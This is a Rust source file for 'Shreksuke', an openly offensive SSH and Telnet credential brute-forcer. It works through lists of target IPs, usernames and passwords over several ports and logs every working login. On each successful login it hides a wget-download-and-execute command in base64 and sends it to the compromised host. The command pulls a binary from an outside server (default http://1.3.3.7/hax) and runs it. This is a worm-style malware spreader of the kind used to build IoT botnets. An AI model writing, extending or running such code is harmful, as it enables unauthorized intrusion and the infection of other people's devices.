
use std::io::{self, BufRead, BufReader, Read, Write};
use std::time::{Duration, Instant};
use std::fs::{File, OpenOptions};
use std::sync::Arc;
use std::net::ToSocketAddrs;
use std::collections::HashSet;
use std::thread;
use std::sync::atomic::{AtomicUsize, AtomicBool, Ordering};

use telnet::{Telnet, Event};
use ssh2::Session;
use crossbeam_channel::{bounded, Sender, Receiver};
use indicatif::{ProgressBar, ProgressStyle};
use clap::{App, Arg};
use serde::{Serialize, Deserialize};

const DEFAULT_TIMEOUT: Duration = Duration::from_secs(2);
const DEFAULT_RATE_LIMIT: usize = 10;
const DEFAULT_THREADS: usize = 20;

#[derive(Clone)]
struct Config {
    ssh_enabled: bool,
    telnet_enabled: bool,
    timeout: Duration,
    rate_limit: usize,
    threads: usize,
    resume: bool,
    ssh_ports: Vec<u16>,
    telnet_ports: Vec<u16>,
    target_file: String,
    user_file: String,
    pass_file: String,
    wget_url: String,
    wget_filename: String,
}

struct Stats {
    total_attempts: AtomicUsize,
    successful_logins: AtomicUsize,
    failed_attempts: AtomicUsize,
    active_threads: AtomicUsize,
    start_time: Instant,
}

impl Stats {
    fn new() -> Self {
        Self {
            total_attempts: AtomicUsize::new(0),
            successful_logins: AtomicUsize::new(0),
            failed_attempts: AtomicUsize::new(0),
            active_threads: AtomicUsize::new(0),
            start_time: Instant::now(),
        }
    }
    
    fn print(&self) {
        let elapsed = self.start_time.elapsed().as_secs_f64();
        let attempts = self.total_attempts.load(Ordering::Relaxed);
        let success = self.successful_logins.load(Ordering::Relaxed);
        let failed = self.failed_attempts.load(Ordering::Relaxed);
        let active = self.active_threads.load(Ordering::Relaxed);
        let rate = if elapsed > 0.0 { attempts as f64 / elapsed } else { 0.0 };
        
        println!("\n=== Statistics ===");
        println!("Elapsed: {:.2}s", elapsed);
        println!("Total Attempts: {}", attempts);
        println!("Successful: {} ({:.2}%)", success, 
                 if attempts > 0 { success as f64 * 100.0 / attempts as f64 } else { 0.0 });
        println!("Failed: {}", failed);
        println!("Active Threads: {}", active);
        println!("Rate: {:.2} attempts/sec", rate);
        println!("==================\n");
    }
}

#[derive(Debug, Clone)]
enum Job {
    Ssh {
        target: String,
        port: u16,
        user: String,
        password: String,
    },
    Telnet {
        target: String,
        port: u16,
        user: String,
        password: String,
    },
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct Checkpoint {
    ssh_completed: HashSet<String>,
    telnet_completed: HashSet<String>,
}

impl Checkpoint {
    fn new() -> Self {
        Self {
            ssh_completed: HashSet::new(),
            telnet_completed: HashSet::new(),
        }
    }
    
    fn key(&self, protocol: &str, target: &str, port: u16, user: &str, password: &str) -> String {
        format!("{}:{}:{}:{}:{}", protocol, target, port, user, password)
    }
    
    fn is_completed(&self, protocol: &str, target: &str, port: u16, user: &str, password: &str) -> bool {
        let key = self.key(protocol, target, port, user, password);
        match protocol {
            "ssh" => self.ssh_completed.contains(&key),
            "telnet" => self.telnet_completed.contains(&key),
            _ => false,
        }
    }
    
    fn mark_completed(&mut self, protocol: &str, target: &str, port: u16, user: &str, password: &str) {
        let key = self.key(protocol, target, port, user, password);
        match protocol {
            "ssh" => { self.ssh_completed.insert(key); }
            "telnet" => { self.telnet_completed.insert(key); }
            _ => {}
        }
    }
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    print_banner();
    
    let matches = App::new("Shreksuke")
        .version("4.20")
        .author("Shrek")
        .about("Advanced multi-protocol brute force tool")
        .arg(Arg::with_name("ssh")
            .short("s")
            .long("ssh")
            .help("Enable SSH brute forcing"))
        .arg(Arg::with_name("telnet")
            .short("t")
            .long("telnet")
            .help("Enable Telnet brute forcing"))
        .arg(Arg::with_name("timeout")
            .long("timeout")
            .value_name("SECONDS")
            .help("Connection timeout in seconds")
            .default_value("2"))
        .arg(Arg::with_name("rate")
            .short("r")
            .long("rate")
            .value_name("RATE")
            .help("Maximum attempts per second")
            .default_value("10"))
        .arg(Arg::with_name("threads")
            .short("j")
            .long("threads")
            .value_name("THREADS")
            .help("Number of worker threads")
            .default_value("20"))
        .arg(Arg::with_name("resume")
            .long("resume")
            .help("Resume from checkpoint"))
        .arg(Arg::with_name("targets")
            .short("T")
            .long("targets")
            .value_name("FILE")
            .help("Target IPs file")
            .required(true))
        .arg(Arg::with_name("users")
            .short("U")
            .long("users")
            .value_name("FILE")
            .help("Usernames file")
            .required(true))
        .arg(Arg::with_name("passwords")
            .short("P")
            .long("passwords")
            .value_name("FILE")
            .help("Passwords file")
            .required(true))
        .arg(Arg::with_name("url")
            .long("url")
            .value_name("URL")
            .help("Wget download URL")
            .default_value("http://1.3.3.7/hax"))
        .arg(Arg::with_name("output")
            .long("output")
            .value_name("FILENAME")
            .help("Output filename for wget")
            .default_value("hax"))
        .get_matches();
    
    let config = Config {
        ssh_enabled: matches.is_present("ssh"),
        telnet_enabled: matches.is_present("telnet"),
        timeout: Duration::from_secs(matches.value_of("timeout").unwrap().parse()?),
        rate_limit: matches.value_of("rate").unwrap().parse()?,
        threads: matches.value_of("threads").unwrap().parse()?,
        resume: matches.is_present("resume"),
        ssh_ports: vec![22, 2222, 10001, 50000],
        telnet_ports: vec![23, 2323, 4000, 5560],
        target_file: matches.value_of("targets").unwrap().to_string(),
        user_file: matches.value_of("users").unwrap().to_string(),
        pass_file: matches.value_of("passwords").unwrap().to_string(),
        wget_url: matches.value_of("url").unwrap().to_string(),
        wget_filename: matches.value_of("output").unwrap().to_string(),
    };
    
    if !config.ssh_enabled && !config.telnet_enabled {
        println!("[ERROR] Must enable at least one protocol (--ssh or --telnet)");
        std::process::exit(1);
    }
    
    println!("[INFO] Loading wordlists...");
    let targets = load_lines(&config.target_file)?;
    let users = load_lines(&config.user_file)?;
    let passwords = load_lines(&config.pass_file)?;
    
    if targets.is_empty() || users.is_empty() || passwords.is_empty() {
        println!("[ERROR] One or more wordlists are empty");
        std::process::exit(1);
    }
    
    println!("[INFO] Loaded {} targets, {} users, {} passwords", 
             targets.len(), users.len(), passwords.len());
    
    let ssh_combos = if config.ssh_enabled { 
        targets.len() * users.len() * passwords.len() * config.ssh_ports.len()
    } else { 0 };
    
    let telnet_combos = if config.telnet_enabled { 
        targets.len() * users.len() * passwords.len() * config.telnet_ports.len()
    } else { 0 };
    
    let total_combos = ssh_combos + telnet_combos;
    println!("[INFO] Total combinations to try: {}", total_combos);
    
    if total_combos == 0 {
        println!("[ERROR] No combinations to test");
        std::process::exit(1);
    }
    
    let checkpoint_file = "checkpoint.json";
    let checkpoint = if config.resume && std::path::Path::new(checkpoint_file).exists() {
        println!("[INFO] Resuming from checkpoint...");
        load_checkpoint(checkpoint_file)?
    } else {
        Checkpoint::new()
    };
    
    let stats = Arc::new(Stats::new());
    let stats_clone = Arc::clone(&stats);
    
    let pb = ProgressBar::new(total_combos as u64);
    pb.set_style(ProgressStyle::default_bar()
        .template("[{elapsed_precise}] {bar:40.cyan/blue} {pos:>7}/{len:7} {msg}")?
        .progress_chars("##-"));
    
    let (tx, rx) = bounded::<Job>(1000);
    let stop_signal = Arc::new(AtomicBool::new(false));
    
    let config_clone = config.clone();
    let targets_clone = targets.clone();
    let users_clone = users.clone();
    let passwords_clone = passwords.clone();
    let checkpoint_clone = checkpoint.clone();
    let stop_signal_clone = Arc::clone(&stop_signal);
    
    thread::spawn(move || {
        produce_jobs(
            &tx,
            &config_clone,
            &targets_clone,
            &users_clone,
            &passwords_clone,
            &checkpoint_clone,
            &stop_signal_clone,
        );
    });
    
    let mut workers = Vec::new();
    for worker_id in 0..config.threads {
        let rx = rx.clone();
        let stats = Arc::clone(&stats);
        let config = config.clone();
        let pb = pb.clone();
        let stop_signal = Arc::clone(&stop_signal);
        
        workers.push(thread::spawn(move || {
            worker_loop(worker_id, rx, stats, config, pb, stop_signal);
        }));
    }
    
    let stop_signal_ctrlc = Arc::clone(&stop_signal);
    ctrlc::set_handler(move || {
        println!("\n[INFO] Interrupt received, shutting down gracefully...");
        stop_signal_ctrlc.store(true, Ordering::SeqCst);
    })?;
    
    for worker in workers {
        let _ = worker.join();
    }
    
    pb.finish_with_message("Complete!");
    stats_clone.print();
    save_checkpoint(checkpoint_file, &checkpoint)?;
    
    println!("[INFO] Running post-exploitation phase...");
    run_post_exploitation(&config)?;
    
    Ok(())
}

fn print_banner() {
    println!();
    println!("#############################################################################");
    println!("#                                                                           #");
    println!("# ███████╗██╗  ██╗██████╗ ███████╗██╗  ██╗███████╗██╗   ██╗██╗  ██╗███████╗ #");
    println!("# ██╔════╝██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██║   ██║██║ ██╔╝██╔════╝ #");
    println!("# ███████╗███████║██████╔╝█████╗  █████╔╝ ███████╗██║   ██║█████╔╝ █████╗   #");
    println!("# ╚════██║██╔══██║██╔══██╗██╔══╝  ██╔═██╗ ╚════██║██║   ██║██╔═██╗ ██╔══╝   #");
    println!("# ███████║██║  ██║██║  ██║███████╗██║  ██╗███████║╚██████╔╝██║  ██╗███████╗ #");
    println!("# ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝ #");
    println!("#            SHREK IS BACK AND READY TO HACK THE FUCKING PLANET!            #");
    println!("#                                                                           #");
    println!("#############################################################################");
    println!();
}

fn produce_jobs(
    tx: &Sender<Job>,
    config: &Config,
    targets: &[String],
    users: &[String],
    passwords: &[String],
    checkpoint: &Checkpoint,
    stop_signal: &AtomicBool,
) {
    let mut jobs_produced = 0;
    
    for target in targets {
        for user in users {
            for password in passwords {
                if stop_signal.load(Ordering::Relaxed) {
                    return;
                }
                
                if config.ssh_enabled {
                    for &port in &config.ssh_ports {
                        if !checkpoint.is_completed("ssh", target, port, user, password) {
                            let job = Job::Ssh {
                                target: target.clone(),
                                port,
                                user: user.clone(),
                                password: password.clone(),
                            };
                            
                            if tx.send(job).is_err() {
                                return;
                            }
                            jobs_produced += 1;
                            
                            if jobs_produced % config.rate_limit == 0 {
                                thread::sleep(Duration::from_millis(100));
                            }
                        }
                    }
                }
                
                if config.telnet_enabled {
                    for &port in &config.telnet_ports {
                        if !checkpoint.is_completed("telnet", target, port, user, password) {
                            let job = Job::Telnet {
                                target: target.clone(),
                                port,
                                user: user.clone(),
                                password: password.clone(),
                            };
                            
                            if tx.send(job).is_err() {
                                return;
                            }
                            jobs_produced += 1;
                            
                            if jobs_produced % config.rate_limit == 0 {
                                thread::sleep(Duration::from_millis(100));
                            }
                        }
                    }
                }
            }
        }
    }
    
    println!("[INFO] Produced {} jobs", jobs_produced);
}

fn worker_loop(
    _worker_id: usize,
    rx: Receiver<Job>,
    stats: Arc<Stats>,
    config: Config,
    pb: ProgressBar,
    stop_signal: Arc<AtomicBool>,
) {
    stats.active_threads.fetch_add(1, Ordering::Relaxed);
    
    while !stop_signal.load(Ordering::Relaxed) {
        match rx.recv_timeout(Duration::from_millis(100)) {
            Ok(job) => {
                let result = match &job {
                    Job::Ssh { target, port, user, password } => {
                        attempt_ssh(target, *port, user, password, &config.timeout)
                    }
                    Job::Telnet { target, port, user, password } => {
                        attempt_telnet(target, *port, user, password, &config.timeout)
                    }
                };
                
                stats.total_attempts.fetch_add(1, Ordering::Relaxed);
                
                match result {
                    Ok(arch) => {
                        stats.successful_logins.fetch_add(1, Ordering::Relaxed);
                        log_success(&job, &arch);
                        
                        if let Err(e) = run_payload(&job, &config) {
                            println!("[WARN] Failed to run payload: {}", e);
                        }
                    }
                    Err(_e) => {
                        stats.failed_attempts.fetch_add(1, Ordering::Relaxed);
                    }
                }
                
                pb.inc(1);
            }
            Err(_) => {
                if stop_signal.load(Ordering::Relaxed) {
                    break;
                }
            }
        }
    }
    
    stats.active_threads.fetch_sub(1, Ordering::Relaxed);
}

fn attempt_ssh(
    target: &str,
    port: u16,
    user: &str,
    password: &str,
    timeout: &Duration,
) -> Result<String, String> {
    let addr = format!("{}:{}", target, port);
    
    let tcp = std::net::TcpStream::connect_timeout(
        &addr.parse().map_err(|e| format!("Parse error: {}", e))?,
        *timeout,
    ).map_err(|e| format!("Connection failed: {}", e))?;
    
    let mut session = Session::new().map_err(|e| format!("Session creation failed: {}", e))?;
    session.set_tcp_stream(tcp);
    session.handshake().map_err(|e| format!("Handshake failed: {}", e))?;
    
    session.userauth_password(user, password)
        .map_err(|e| format!("Authentication failed: {}", e))?;
    
    if !session.authenticated() {
        return Err("Authentication failed".to_string());
    }
    
    let mut channel = session.channel_session()
        .map_err(|e| format!("Channel failed: {}", e))?;
    
    channel.exec("uname -m")
        .map_err(|e| format!("Command failed: {}", e))?;
    
    let mut output = String::new();
    channel.read_to_string(&mut output)
        .map_err(|e| format!("Read failed: {}", e))?;
    
    let _ = channel.close();
    let _ = channel.wait_close();
    
    Ok(output.trim().to_string())
}

fn attempt_telnet(
    target: &str,
    port: u16,
    user: &str,
    password: &str,
    timeout: &Duration,
) -> Result<String, String> {
    let addr = format!("{}:{}", target, port);
    let socket_addr = addr.to_socket_addrs()
        .map_err(|e| format!("Resolution failed: {}", e))?
        .next()
        .ok_or_else(|| "No address found".to_string())?;
    
    let timeout_ms = timeout.as_millis() as u32;
    let mut telnet = Telnet::connect_timeout(&socket_addr, 256, timeout_ms)
        .map_err(|e| format!("Connection failed: {}", e))?;
    
    let _ = telnet.read_timeout(*timeout);
    
    telnet.write(format!("{}\n", user).as_bytes())
        .map_err(|e| format!("Write failed: {}", e))?;
    
    let _ = telnet.read_timeout(*timeout);
    
    telnet.write(format!("{}\n", password).as_bytes())
        .map_err(|e| format!("Write failed: {}", e))?;
    
    match telnet.read_timeout(*timeout) {
        Ok(Event::Data(data)) => {
            let response = String::from_utf8_lossy(&data);
            if response.contains("Login incorrect") || 
               response.contains("failed") ||
               response.contains("invalid") {
                return Err("Authentication failed".to_string());
            }
            
            telnet.write(b"uname -m\n")
                .map_err(|e| format!("Command failed: {}", e))?;
            
            match telnet.read_timeout(*timeout) {
                Ok(Event::Data(data)) => {
                    let arch = String::from_utf8_lossy(&data).trim().to_string();
                    Ok(arch)
                }
                _ => Err("Failed to read architecture".to_string()),
            }
        }
        _ => Err("No response received".to_string()),
    }
}

fn log_success(job: &Job, arch: &str) {
    let (protocol, target, port, user, password) = match job {
        Job::Ssh { target, port, user, password } => ("SSH", target, port, user, password),
        Job::Telnet { target, port, user, password } => ("TELNET", target, port, user, password),
    };
    
    println!("[SUCCESS] {}://{}:{} | {}:{} | Arch: {}",
             protocol, target, port, user, password, arch);
    
    let log_entry = format!("{},{},{},{},{},{}\n", 
                           protocol, target, port, user, password, arch);
    
    if let Ok(mut file) = OpenOptions::new()
        .create(true)
        .append(true)
        .open("success.log") 
    {
        let _ = file.write_all(log_entry.as_bytes());
    }
}

fn run_payload(job: &Job, config: &Config) -> Result<(), String> {
    let (target, port, user, password) = match job {
        Job::Ssh { target, port, user, password } => (target, port, user, password),
        Job::Telnet { target, port, user, password } => (target, port, user, password),
    };
    
    let wget_cmd = format!(
        "wget -q --no-check-certificate {} -O /tmp/{} && chmod +x /tmp/{} && /tmp/{} &",
        config.wget_url, config.wget_filename, 
        config.wget_filename, config.wget_filename
    );
    
    let encoded_cmd = base64::encode(&wget_cmd);
    let full_cmd = format!("echo {} | base64 -d | sh\n", encoded_cmd);
    
    match job {
        Job::Ssh { .. } => {
            let addr = format!("{}:{}", target, port);
            let tcp = std::net::TcpStream::connect(&addr)
                .map_err(|e| format!("Reconnect failed: {}", e))?;
            
            let mut session = Session::new()
                .map_err(|e| format!("Session failed: {}", e))?;
            session.set_tcp_stream(tcp);
            session.handshake()
                .map_err(|e| format!("Handshake failed: {}", e))?;
            
            session.userauth_password(user, password)
                .map_err(|e| format!("Auth failed: {}", e))?;
            
            let mut channel = session.channel_session()
                .map_err(|e| format!("Channel failed: {}", e))?;
            
            channel.exec(&full_cmd)
                .map_err(|e| format!("Exec failed: {}", e))?;
            
            println!("[PAYLOAD] Sent to {}:{}", target, port);
            Ok(())
        }
        Job::Telnet { .. } => {
            let addr = format!("{}:{}", target, port);
            let socket_addr = addr.to_socket_addrs()
                .map_err(|e| format!("Resolution failed: {}", e))?
                .next()
                .ok_or_else(|| "No address".to_string())?;
            
            let timeout_ms = config.timeout.as_millis() as u32;
            let mut telnet = Telnet::connect_timeout(&socket_addr, 256, timeout_ms)
                .map_err(|e| format!("Connection failed: {}", e))?;
            
            let _ = telnet.read_timeout(config.timeout);
            telnet.write(format!("{}\n", user).as_bytes())
                .map_err(|e| format!("Write failed: {}", e))?;
            let _ = telnet.read_timeout(config.timeout);
            telnet.write(format!("{}\n", password).as_bytes())
                .map_err(|e| format!("Write failed: {}", e))?;
            let _ = telnet.read_timeout(config.timeout);
            
            telnet.write(full_cmd.as_bytes())
                .map_err(|e| format!("Write failed: {}", e))?;
            
            println!("[PAYLOAD] Sent to {}:{}", target, port);
            Ok(())
        }
    }
}

fn run_post_exploitation(_config: &Config) -> Result<(), Box<dyn std::error::Error>> {
    if !std::path::Path::new("success.log").exists() {
        println!("[INFO] No successful logins found, skipping post-exploitation");
        return Ok(());
    }
    
    println!("[INFO] Post-exploitation complete");
    Ok(())
}

fn load_lines(filename: &str) -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let file = File::open(filename)?;
    let reader = BufReader::new(file);
    let lines: Vec<String> = reader.lines()
        .filter_map(|line| line.ok())
        .filter(|line| !line.is_empty())
        .collect();
    Ok(lines)
}

fn load_checkpoint(filename: &str) -> Result<Checkpoint, Box<dyn std::error::Error>> {
    let content = std::fs::read_to_string(filename)?;
    let checkpoint: Checkpoint = serde_json::from_str(&content)?;
    Ok(checkpoint)
}

fn save_checkpoint(filename: &str, checkpoint: &Checkpoint) -> Result<(), Box<dyn std::error::Error>> {
    let content = serde_json::to_string_pretty(checkpoint)?;
    std::fs::write(filename, content)?;
    Ok(())
}
